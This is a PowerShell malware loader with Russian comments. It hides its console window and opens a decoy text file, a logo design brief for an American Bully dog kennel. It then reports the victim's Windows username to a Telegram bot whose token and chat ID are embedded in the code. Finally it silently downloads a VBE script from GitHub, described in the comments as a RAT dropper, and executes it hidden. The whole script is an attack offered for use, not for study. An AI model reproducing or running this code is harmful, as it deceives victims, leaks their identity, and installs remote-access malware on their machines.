# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "TZambully_house_kennel_club.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
1. Краткое описание проекта
Разработать логотип для питомника породистых американских булли «AmBully House Kennel Club». Питомник позиционируется как профессиональная, надежная и престижная организация, занимающаяся разведением собак с отличной генетикой, крепким здоровьем и стабильной психикой. Логотип должен отражать ключевые ценности: силу и мощь породы, престиж, надежность, ответственность заводчиков и заботливый «домашний» подход (как отражено в слове «House»).

2. Целевая аудитория 
    Основная: Взрослые люди 25-55 лет, состоятельные или среднеобеспеченные, ищущие статусного, преданного питомца для семьи или защиты. Ценят качество, чистоту породы, репутацию заводчика и экспертизу.
    Вторичная: Опытные кинологи, участники собачьих выставок, владельцы других питомников для потенциального сотрудничества.

3. Идеи и ассоциации, которые должен вызывать логотип
    Сила, мощь, надежность: крепкая челюсть, мощная шея, атлетический силуэт собаки, щит, гербовая фигура, колонны.
    Превосходство, статус, чистота породы: корона, медальон, стилизованная буква «A» (от American/AmBully), звезда.
    Доверие, защита, семья («House»): стилизованное изображение дома/крыши, очертания сердца, надежная арка или ворота.
    Профессионализм и клубность: лаконичные, строгие формы, ощущение печати или эмблемы закрытого клуба.

4. Цветовая гамма
    Предпочтительная: Солидная, благородная палитра. Оттенки глубокого синего, графитового и антрацитового серого, темно-коричневого, бордового, изумрудно-зеленого. Допустимы акценты благородного золота, серебра или белого для контраста и выделения деталей.
    Нежелательная: Яркие, «детские» цвета (розовый, салатовый, ярко-желтый), излишне агрессивные комбинации (например, кислотный зеленый с черным), пастельная гамма.
    Предпочтительные: Солидные, уверенные шрифты. Мощные брусковые антиквы или строгие геометрические гротески без засечек. Шрифты должны передавать стабильность и надежность. Важна отличная читаемость слов «AmBully House» и, возможно, «Kennel Club» в меньшем кегле.
    Нежелательные: Легкомысленные, рукописные, слишком декоративные или готические шрифты. Шрифты, ассоциирующиеся с дешевизной или несерьезностью.

6. Идеи для графики (эскиза)
    Эмблема/Герб: Стилизованное изображение головы американского булли (акцент на мощных чертах) вписано в форму щита, медальона или внутри арки/дома. Снизу или по окружности расположена надпись «AmBully House Kennel Club».
    Текстово-символический: Мощный шрифт для слова «AMBULLY», над буквами «A» и «H» которых размещена стилизованная крыша (дом) или корона. Ниже — строка «Kennel Club» более легким шрифтом.
    Минималистичный знак: Абстрактный, но узнаваемый символ, сочетающий в себе два элемента: силуэт уха/головы булли и контур дома или щита. Этот знак размещается слева от текстового названия, выполненного строгим шрифтом.
    Печать/Клеймо: Круговая композиция, напоминающая печать или клеймо. В центре — лаконичный силуэт собаки в стойке, по внешнему кругу — полное название питомника и небольшие элементы (звезды, точки). Внизу — год основания (если актуально).
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit